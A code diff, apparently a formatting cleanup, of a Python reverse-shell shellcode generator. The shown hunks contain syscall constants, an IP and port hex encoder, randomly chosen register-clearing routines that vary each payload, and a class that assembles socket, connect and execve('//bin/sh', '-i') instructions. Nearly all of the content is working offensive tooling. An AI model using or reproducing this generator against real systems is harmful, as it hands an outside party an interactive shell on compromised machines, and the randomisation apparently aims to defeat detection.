@@ -1,14 +1,14 @@
 # Author : Joakim PETTESEN <jo.pettersen@proton.me> 
 # Author : Léo PEROCHON <leo78@orange.fr>
 
-''' IMPORT '''
+# IMPORTS
 
 import socket
 from sys import argv
 from random import randrange
 
 
-''' CONSTANTS '''
+# CONSTANTS
 
 # Syscalls
 SYS_SOCKET = r"\x29"
@@ -83,7 +83,7 @@ SHELL = [
 ]
 
 
-''' FUNCTIONS '''
+# FUNCTIONS
 
 # Parse IP and return hexa
 def gen_ip_in_hex(splited_ip, inc: int):
@@ -98,14 +98,18 @@ def gen_ip_in_hex(splited_ip, inc: int):
     splitted = [line[i:i+n] for i in range(0, len(line), n)]
     return r"\x" + r"\x".join(splitted)
 
+
 def clean_by_xor(reg: str):
     return XOR[f"{reg},{reg}"]
+
 
 def clean_by_shr(reg: str):
     return SHR[f"{reg},64"]
 
+
 def clean_by_sub(reg: str):
     return SUB[f"{reg},{reg}"]
+
 
 # Hold list of clean functions for random usage
 clean_functions = [
@@ -114,10 +118,12 @@ clean_functions = [
     clean_by_shr,
 ]
 
-''' CLASS '''
+
+# CLASS
+
 
 # Shellcode generator
-class Shellcode():
+class Shellcode:
     __code: str = ""
 
     def __init__(self, code: str = None) -> None:
@@ -139,7 +145,7 @@ class Shellcode():
         self.__code += clean_functions[rd_index](reg)
 
     def create_socket(self, family: int, socket_type: int):
-        family = r"\x" + str(family).zfill(2) # 2 -> \x02
+        family = r"\x" + str(family).zfill(2)  # 2 -> \x02
         socket_type = r"\x" + str(socket_type).zfill(2)
 
         self.__code += MOV["al"] + SYS_SOCKET
@@ -154,7 +160,6 @@ class Shellcode():
         port_hex = socket.htons(port)
         port_hex = port_hex.to_bytes(2, byteorder='little')
         port_hex = ''.join(['\\x{:02x}'.format(b) for b in port_hex])
-        
         
         inc = randrange(5) + 1
         ip_hex = gen_ip_in_hex(splited_ip, inc)
@@ -219,11 +224,11 @@ class Shellcode():
         # Argv
         self.__code += PUSH["rax"]
         self.__code += PUSH["-i"]
-        self.__code += MOV["rdx,rsp"] # rdx: "-i"
+        self.__code += MOV["rdx,rsp"]  # rdx: "-i"
         self.__code += PUSH["rax"]
         self.__code += PUSH["rdx"]
         self.__code += PUSH["rdi"]
-        self.__code += MOV["rsi,rsp"] # rsi: ["//bin/sh", "-i"]
+        self.__code += MOV["rsi,rsp"]  # rsi: ["//bin/sh", "-i"]
 
         # Envp
         self.clean("rdx")
@@ -240,7 +245,7 @@ class Shellcode():
         self.__code += SYSCALL
 
 
-''' MAIN '''
+# MAIN
 
 def main():
 
